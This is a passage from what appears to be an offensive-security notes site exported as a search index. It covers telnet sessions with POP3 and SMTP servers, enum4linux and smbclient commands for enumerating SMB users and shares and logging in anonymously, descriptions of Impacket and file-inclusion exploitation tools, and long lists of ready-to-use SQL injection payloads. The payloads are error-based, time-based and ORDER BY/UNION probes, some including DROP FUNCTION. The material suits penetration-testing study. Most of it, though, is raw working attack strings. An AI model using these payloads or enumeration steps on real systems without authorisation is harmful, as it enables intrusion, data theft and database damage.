Sending email with Telnet\nHello Frank,\nI am just writing to say hi!\n.\nQUIT\n\n\n#+OK MACHINE_IP closing connection\n#Connection closed by foreign host.\n</code></pre>"},{"location":"Cyber_Offensive/Services/MSSQL/","title":"MSSQL","text":""},{"location":"Cyber_Offensive/Services/MSSQL/#tools","title":"Tools","text":"<ul> <li> <p>mssqlinstance.py: Retrieves the MSSQL instances names from the target host.</p> </li> <li> <p>mssqlclient.py: An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS.</p> </li> </ul>"},{"location":"Cyber_Offensive/Services/POP3/","title":"POP3","text":""},{"location":"Cyber_Offensive/Services/POP3/#summary-and-commands","title":"Summary and Commands","text":"<p>POP3 RFC 1939</p> <p>Incoming email (POP3) uses port 110</p> Command Comment USER Your user name for this mail server PASS Your password QUIT End your session STAT Number and total size of all messages LIST Message# and size of message RETR message# Retrieve selected message DELE message# Delete selected message NOOP No-op. Keeps you connection open RSET Reset the mailbox. Undelete deleted messages <p>Normal program flow: USER PASS LIST DELE QUIT</p>"},{"location":"Cyber_Offensive/Services/POP3/#example","title":"Example","text":"<pre><code>telnet 10.10.45.250 110\n\n#Trying 10.10.45.250...\n#Connected to MACHINE_IP.\n#Escape character is '^]'.\n#+OK MACHINE_IP Mail Server POP3 Wed, 15 Sep 2021 11:05:34 +0300 \n</code></pre> <pre><code>USER &lt;frank&gt;\n\n#+OK frank\n</code></pre> <pre><code>PASS &lt;D2xc9CgD&gt;\n\n#+OK 1 messages (179) octets\n</code></pre> <pre><code>STAT\n\n#+OK 1 179\n</code></pre> <pre><code>LIST\n\n#+OK 1 messages (179) octets\n</code></pre> <pre><code>1 179\n.\nRETR 1\n\n#+OK\n</code></pre> <pre><code>From: Mail Server \nTo: Frank \nsubject: Sending email with Telnet\nHello Frank,\nI am just writing to say hi!\n.\nQUIT\n\n#+OK MACHINE_IP closing connection\n#Connection closed by foreign host.\n</code></pre>"},{"location":"Cyber_Offensive/Services/SMTP/","title":"SMTP","text":""},{"location":"Cyber_Offensive/Services/SMTP/#summary-and-commands","title":"Summary and Commands","text":"<p>Simple Mail Transfer Protocol rfc5321 Message Submission for Mail rfc6409</p> <p>Outgoing email (SMTP) uses port 25</p> Command Comment ATRN Authenticated TURN AUTH Authentication BDAT Binary data BURL Remote content DATA The actual email message to be sent. This command is terminated with a line that contains only a EHLO Extended HELO ETRN Extended turn EXPN Expand HELO Identify yourself to the SMTP server. HELP Show available commands MAIL Send mail from email account MAIL FROM: me@mydomain.com NOOP No-op. Keeps you connection open. ONEX One message transaction only QUIT End session RCPT Send email to recipient RCPT TO: you@yourdomain.com RSET Reset SAML Send and mail SEND Send SOML Send or mail STARTTLS SUBMITTER SMTP responsible submitter TURN Turn VERB Verbose VRFY Verify"},{"location":"Cyber_Offensive/Services/SMTP/#example","title":"Example","text":"<pre><code>telnet 10.10.45.250 25\n#Trying 10.10.45.250...\n#Connected to MACHINE_IP.\n#Escape character is '^]'.\n#220 bento.localdomain ESMTP Postfix (Ubuntu)\n</code></pre> <pre><code>helo telnet\n#250 bento.localdomain\n</code></pre> <pre><code>mail from: \n#250 2.1.0 Ok\n</code></pre> <pre><code>rcpt to: \n#250 2.1.5 Ok\n</code></pre> <pre><code>data\n#354 End data with .\n</code></pre> <pre><code>subject: Sending email with Telnet\nHello Frank,\nI am just writing to say hi!             \n.\n#250 2.0.0 Ok: queued as C3E7F45F06\n</code></pre> <pre><code>quit\n#221 2.0.0 Bye\n#Connection closed by foreign host.\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/","title":"SAMBA - SMB","text":""},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#runs-all-options-apart-from-dictionary-based-share-name-guessing","title":"runs all options apart from dictionary based share name guessing","text":"<pre><code>enum4linux -a target-ip\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#list-usernames","title":"list usernames","text":"<pre><code>enum4linux -U x.x.x.x\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#list-windows-shares","title":"list windows shares","text":"<pre><code>enum4linux -S x.x.x.x\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#dictionary-attack","title":"dictionary attack","text":"<pre><code>enum4linux -s shares.txt target-ip\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#pull-usernames-from-the-default-rid-range-500-5501000-1050","title":"pull usernames from the default RID range (500-550,1000-1050)","text":"<pre><code>enum4linux -r target-ip\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#pull-usernames-using-a-custom-rid-range","title":"pull usernames using a custom RID range","text":"<pre><code>enum4linux -R 600-660 target-ip\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#view-password-policy","title":"view password policy","text":"<pre><code>enum4linux -P x.x.x.x\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#view-os-info","title":"view OS info","text":"<pre><code>enum4linux -o x.x.x.x\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#list-groups","title":"list groups","text":"<pre><code>enum4linux -G target-ip\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#if-on-domain-tried-to-get-some-ldap-info","title":"if on domain, tried to get some LDAP info","text":"<pre><code>enum4linux -l x.x.x.x\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#-i-flag-any-printer-info","title":"-i flag any Printer info","text":"<pre><code>enum4linux -i x.x.x.x\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#netbios-info","title":"NetBIOS info","text":"<pre><code>enum4linux -n x.x.x.x\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#run-all-simple-enumeration","title":"run all simple enumeration","text":"<pre><code>enum4linux -a x.x.x.x\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#connect-with-user-and-password","title":"connect with user and password","text":"<pre><code>enum4linux -u administrator -p password -U target-ip\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SAMBA_-_SMB/#verbose-mode","title":"verbose mode","text":"<pre><code>enum4linux -v target-ip\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SMB_Client/","title":"SMB Client","text":""},{"location":"Cyber_Offensive/Services/Samba_SMB/SMB_Client/#get-list-of-shares-on-target","title":"get list of shares on target","text":"<pre><code>smbclient -L //10.10.0.50/\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SMB_Client/#if-it-was-misconfigured-we-can-log-in-anonymously-by-simply-hitting-enter-at-the-prompt","title":"if it was misconfigured, we can log in anonymously by simply hitting\u00a0Enter\u00a0at the prompt","text":"<pre><code>#-U flag to specify the username (in this case a blank string) and the -N flag to specify no password\nsmbclient -L //10.10.0.50/ -U '' -N\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SMB_Client/#connect-to-share-name","title":"connect to share name","text":"<pre><code>smbclient //10.10.0.50/&lt;sharename&gt;\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SMB_Client/#list-directory","title":"list directory","text":"<pre><code>dir\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SMB_Client/#download-file","title":"download file","text":"<pre><code>get example.txt\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/SMB_Client/#upload-file","title":"upload file","text":"<pre><code>put evil_file.txt\n</code></pre>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/","title":"Tools","text":""},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#smbclientpy","title":"smbclient.py","text":"<ul> <li>A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It\u2019s an excellent example to see how to use impacket.smb in action.</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#addcomputerpy","title":"addcomputer.py","text":"<ul> <li>Allows to add a computer to a domain using LDAP or SAMR (SMB).</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#getarchpy","title":"getArch.py","text":"<ul> <li>This script will connect against a target (or list of targets) machine/s and gather the OS architecture type installed by (ab)using a documented MSRPC feature.</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#exchangerpy","title":"exchanger.py","text":"<ul> <li>A tool for connecting to MS Exchange via RPC over HTTP v2.</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#lookupsidpy","title":"lookupsid.py","text":"<ul> <li>A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface, aiming at finding remote users/groups.</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#netviewpy","title":"netview.py","text":"<ul> <li>Gets a list of the sessions opened at the remote hosts and keep track of them looping over the hosts found and keeping track of who logged in/out from remote servers.</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#regpy","title":"reg.py","text":"<ul> <li>Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. The idea is to provide similar functionality as the REG.EXE Windows utility.</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#rpcdumppy","title":"rpcdump.py","text":"<ul> <li>This script will dump the list of RPC endpoints and string bindings registered at the target. It will also try to match them with a list of well known endpoints.</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#rpcmappy","title":"rpcmap.py","text":"<ul> <li>Scan for listening DCE/RPC interfaces. This binds to the MGMT interface and gets a list of interface UUIDs. If the MGMT interface is not available, it takes a list of interface UUIDs seen in the wild and tries to bind to each interface.</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#samrdumppy","title":"samrdump.py","text":"<ul> <li>An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service.</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#servicespy","title":"services.py","text":"<ul> <li>This script can be used to manipulate Windows services through the ### </li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#smbpasswdpy","title":"smbpasswd.py","text":"<ul> <li>This script is an alternative to smbpasswd tool and intended to be used for changing expired passwords remotely over SMB (MSRPC-SAMR)</li> </ul>"},{"location":"Cyber_Offensive/Services/Samba_SMB/Tools/#ms-scmr-msrpc-interface","title":"MS-SCMR MSRPC Interface","text":"<ul> <li>It supports start, stop, delete, status, config, list, create and change.</li> </ul>"},{"location":"Cyber_Offensive/Web/RFI-LFI_File_Inclusion/","title":"RFI-LFI File Inclusion","text":"<p>FDsploit - github</p> <p>FDsploit can be used to discover and exploit Local/Remote File Inclusion and directory traversal vulnerabilities automatically. In case an LFI vulnerability is found, --lfishell option can be used to exploit it. For now, 3 different types of LFI shells are supported:</p> <p>simple: This type of shell allows user to read files easily without having to type the url everytime. Also it only provides the output of the file and not the whole html-source code of the page which makes it very useful. expect: This type of shell is a semi-interactive shell which allows user to execute commands through PHP's expect:// wrapper. input: This type of shell is a semi-interactive shell which also allows user to execute commands through PHP's php://input stream.</p> <p>Venom - github</p> <p>Docker Install</p> <p>Venom Docker - github</p> <pre><code>docker pull vittring/venom:yggdrasil\n</code></pre> <p>ronin-vulns - github</p> <p>Install - requires Ruby &gt;= 3.0.0</p> <pre><code>gem install ronin-vulns\n</code></pre> <p>Gemfile</p> <pre><code>gem 'ronin-vulns', '~&gt; 0.1'\n</code></pre> <p>gemspec</p> <pre><code>gem.add_dependency 'ronin-vulns', '~&gt; 0.1'\n</code></pre>"},{"location":"Cyber_Offensive/Web/SQL_Injection/","title":"SQL Injection","text":""},{"location":"Cyber_Offensive/Web/SQL_Injection/#tools","title":"Tools","text":"<ul> <li>SQLMap\u00a0\u2013 Automatic SQL Injection And Database Takeover Tool</li> <li>jSQL Injection\u00a0\u2013 Java Tool For Automatic SQL Database Injection</li> <li>BBQSQL\u00a0\u2013 A Blind SQL-Injection Exploitation Tool</li> <li>NoSQLMap\u00a0\u2013 Automated NoSQL Database Pwnage</li> <li>Whitewidow\u00a0\u2013 SQL Vulnerability Scanner</li> <li>DSSS\u00a0\u2013 Damn Small SQLi Scanner   </li> <li>explo\u00a0\u2013 Human And Machine Readable Web Vulnerability Testing Format</li> <li>Blind-Sql-Bitshifting\u00a0\u2013 Blind SQL-Injection via Bitshifting</li> <li>Leviathan\u00a0\u2013 Wide Range Mass Audit Toolkit</li> <li>Blisqy\u00a0\u2013 Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)</li> </ul>"},{"location":"Cyber_Offensive/Web/SQL_Injection/#generic-sql-injection-payloads","title":"Generic SQL Injection Payloads","text":"<pre><code>'\n''\n`\n``\n,\n\"\n\"\"\n/\n//\n\\\n\\\\\n;\n' or \"\n-- or # \n' OR '1\n' OR 1 -- -\n\" OR \"\" = \"\n\" OR 1 = 1 -- -\n' OR '' = '\n'='\n'LIKE'\n'=0--+\nOR 1=1\n' OR 'x'='x\n' AND id IS NULL; --\n'''''''''''''UNION SELECT '2\n%00\n/*\u2026*/ \n+       addition, concatenate (or space in url)\n||      (double pipe) concatenate\n%       wildcard attribute indicator\n\n@variable   local variable\n@@variable  global variable\n\n\n# Numeric\nAND 1\nAND 0\nAND true\nAND false\n1-false\n1-true\n1*56\n-2\n\n\n1' ORDER BY 1--+\n1' ORDER BY 2--+\n1' ORDER BY 3--+\n\n1' ORDER BY 1,2--+\n1' ORDER BY 1,2,3--+\n\n1' GROUP BY 1,2,--+\n1' GROUP BY 1,2,3--+\n' GROUP BY columnnames having 1=1 --\n\n\n-1' UNION SELECT 1,2,3--+\n' UNION SELECT sum(columnname ) from tablename --\n\n\n-1 UNION SELECT 1 INTO @,@\n-1 UNION SELECT 1 INTO @,@,@\n\n1 AND (SELECT * FROM Users) = 1 \n\n' AND MID(VERSION(),1,1) = '5';\n\n' and 1 in (select min(name) from sysobjects where xtype = 'U' and name &gt; '.') --\n\n\nFinding the table name\n\n\nTime-Based:\n,(select * from (select(sleep(10)))a)\n%2c(select%20*%20from%20(select(sleep(10)))a)\n';WAITFOR DELAY '0:0:30'--\n\nComments:\n</code></pre>"},{"location":"Cyber_Offensive/Web/SQL_Injection/#generic-error-based-payloads","title":"Generic Error Based Payloads","text":"<pre><code>OR 1=1\nOR 1=0\nOR x=x\nOR x=y\nOR 1=1#\nOR 1=0#\nOR x=x#\nOR x=y#\nOR 1=1-- \nOR 1=0-- \nOR x=x-- \nOR x=y-- \nOR 3409=3409 AND ('pytW' LIKE 'pytW\nOR 3409=3409 AND ('pytW' LIKE 'pytY\nHAVING 1=1\nHAVING 1=0\nHAVING 1=1#\nHAVING 1=0#\nHAVING 1=1-- \nHAVING 1=0-- \nAND 1=1\nAND 1=0\nAND 1=1-- \nAND 1=0-- \nAND 1=1#\nAND 1=0#\nAND 1=1 AND '%'='\nAND 1=0 AND '%'='\nAND 1083=1083 AND (1427=1427\nAND 7506=9091 AND (5913=5913\nAND 1083=1083 AND ('1427=1427\nAND 7506=9091 AND ('5913=5913\nAND 7300=7300 AND 'pKlZ'='pKlZ\nAND 7300=7300 AND 'pKlZ'='pKlY\nAND 7300=7300 AND ('pKlZ'='pKlZ\nAND 7300=7300 AND ('pKlZ'='pKlY\nAS INJECTX WHERE 1=1 AND 1=1\nAS INJECTX WHERE 1=1 AND 1=0\nAS INJECTX WHERE 1=1 AND 1=1#\nAS INJECTX WHERE 1=1 AND 1=0#\nAS INJECTX WHERE 1=1 AND 1=1--\nAS INJECTX WHERE 1=1 AND 1=0--\nWHERE 1=1 AND 1=1\nWHERE 1=1 AND 1=0\nWHERE 1=1 AND 1=1#\nWHERE 1=1 AND 1=0#\nWHERE 1=1 AND 1=1--\nWHERE 1=1 AND 1=0--\nORDER BY 1-- \nORDER BY 2-- \nORDER BY 3-- \nORDER BY 4-- \nORDER BY 5-- \nORDER BY 6-- \nORDER BY 7-- \nORDER BY 8-- \nORDER BY 9-- \nORDER BY 10-- \nORDER BY 11-- \nORDER BY 12-- \nORDER BY 13-- \nORDER BY 14-- \nORDER BY 15-- \nORDER BY 16-- \nORDER BY 17-- \nORDER BY 18-- \nORDER BY 19-- \nORDER BY 20-- \nORDER BY 21-- \nORDER BY 22-- \nORDER BY 23-- \nORDER BY 24-- \nORDER BY 25-- \nORDER BY 26-- \nORDER BY 27-- \nORDER BY 28-- \nORDER BY 29-- \nORDER BY 30-- \nORDER BY 31337-- \nORDER BY 1# \nORDER BY 2# \nORDER BY 3# \nORDER BY 4# \nORDER BY 5# \nORDER BY 6# \nORDER BY 7# \nORDER BY 8# \nORDER BY 9# \nORDER BY 10# \nORDER BY 11# \nORDER BY 12# \nORDER BY 13# \nORDER BY 14# \nORDER BY 15# \nORDER BY 16# \nORDER BY 17# \nORDER BY 18# \nORDER BY 19# \nORDER BY 20# \nORDER BY 21# \nORDER BY 22# \nORDER BY 23# \nORDER BY 24# \nORDER BY 25# \nORDER BY 26# \nORDER BY 27# \nORDER BY 28# \nORDER BY 29# \nORDER BY 30#\nORDER BY 31337#\nORDER BY 1 \nORDER BY 2 \nORDER BY 3 \nORDER BY 4 \nORDER BY 5 \nORDER BY 6 \nORDER BY 7 \nORDER BY 8 \nORDER BY 9 \nORDER BY 10 \nORDER BY 11 \nORDER BY 12 \nORDER BY 13 \nORDER BY 14 \nORDER BY 15 \nORDER BY 16 \nORDER BY 17 \nORDER BY 18 \nORDER BY 19 \nORDER BY 20 \nORDER BY 21 \nORDER BY 22 \nORDER BY 23 \nORDER BY 24 \nORDER BY 25 \nORDER BY 26 \nORDER BY 27 \nORDER BY 28 \nORDER BY 29 \nORDER BY 30 \nORDER BY 31337 \nRLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\nRLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\nIF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--\nIF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--\n%' AND 8310=8310 AND '%'='\n%' AND 8310=8311 AND '%'='\nand (select substring(@@version,1,1))='X'\nand (select substring(@@version,1,1))='M'\nand (select substring(@@version,2,1))='i'\nand (select substring(@@version,2,1))='y'\nand (select substring(@@version,3,1))='c'\nand (select substring(@@version,3,1))='S'\nand (select substring(@@version,3,1))='X'\n</code></pre>"},{"location":"Cyber_Offensive/Web/SQL_Injection/#generic-time-based-sql-injection-payloads","title":"Generic Time Based SQL Injection Payloads","text":"<pre><code># from wapiti\nsleep(5)#\n1 or sleep(5)#\n\" or sleep(5)#\n' or sleep(5)#\n\" or sleep(5)=\"\n' or sleep(5)='\n1) or sleep(5)#\n\") or sleep(5)=\"\n') or sleep(5)='\n1)) or sleep(5)#\n\")) or sleep(5)=\"\n')) or sleep(5)='\n;waitfor delay '0:0:5'--\n);waitfor delay '0:0:5'--\n';waitfor delay '0:0:5'--\n\";waitfor delay '0:0:5'--\n');waitfor delay '0:0:5'--\n\");waitfor delay '0:0:5'--\n));waitfor delay '0:0:5'--\n'));waitfor delay '0:0:5'--\n\"));waitfor delay '0:0:5'--\nbenchmark(10000000,MD5(1))#\n1 or benchmark(10000000,MD5(1))#\n\" or benchmark(10000000,MD5(1))#\n' or benchmark(10000000,MD5(1))#\n1) or benchmark(10000000,MD5(1))#\n\") or benchmark(10000000,MD5(1))#\n') or benchmark(10000000,MD5(1))#\n1)) or benchmark(10000000,MD5(1))#\n\")) or benchmark(10000000,MD5(1))#\n')) or benchmark(10000000,MD5(1))#\npg_sleep(5)--\n1 or pg_sleep(5)--\n\" or pg_sleep(5)--\n' or pg_sleep(5)--\n1) or pg_sleep(5)--\n\") or pg_sleep(5)--\n') or pg_sleep(5)--\n1)) or pg_sleep(5)--\n\")) or pg_sleep(5)--\n')) or pg_sleep(5)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe\nAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#\nSLEEP(5)#\nSLEEP(5)--\nSLEEP(5)=\"\nSLEEP(5)='\nor SLEEP(5)\nor SLEEP(5)#\nor SLEEP(5)--\nor SLEEP(5)=\"\nor SLEEP(5)='\nwaitfor delay '00:00:05'\nwaitfor delay '00:00:05'--\nwaitfor delay '00:00:05'#\nbenchmark(50000000,MD5(1))\nbenchmark(50000000,MD5(1))--\nbenchmark(50000000,MD5(1))#\nor benchmark(50000000,MD5(1))\nor benchmark(50000000,MD5(1))--\nor benchmark(50000000,MD5(1))#\npg_SLEEP(5)\npg_SLEEP(5)--\npg_SLEEP(5)#\nor pg_SLEEP(5)\nor pg_SLEEP(5)--\nor pg_SLEEP(5)#\n'\\\"\nAnD SLEEP(5)\nAnD SLEEP(5)--\nAnD SLEEP(5)#\n&amp;&amp;SLEEP(5)\n&amp;&amp;SLEEP(5)--\n&amp;&amp;SLEEP(5)#\n' AnD SLEEP(5) ANd '1\n'&amp;&amp;SLEEP(5)&amp;&amp;'1\nORDER BY SLEEP(5)\nORDER BY SLEEP(5)--\nORDER BY SLEEP(5)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--\n+benchmark(3200,SHA1(1))+'\n+ SLEEP(10) + '\nRANDOMBLOB(500000000/2)\nAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\nOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\nRANDOMBLOB(1000000000/2)\nAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nSLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/\n</code></pre>"},{"location":"Cyber_Offensive/Web/SQL_Injection/#generic-union-select-payloads","title":"Generic Union Select Payloads","text":"<pre><code>ORDER BY SLEEP(5)\nORDER BY 1,SLEEP(5)\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\nORDER BY SLEEP(5)#\nORDER BY 1,SLEEP(5)#\nORDER BY 1,SLEEP(5),3#\nORDER BY 1,SLEEP(5),3,4#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\nORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\nORDER BY 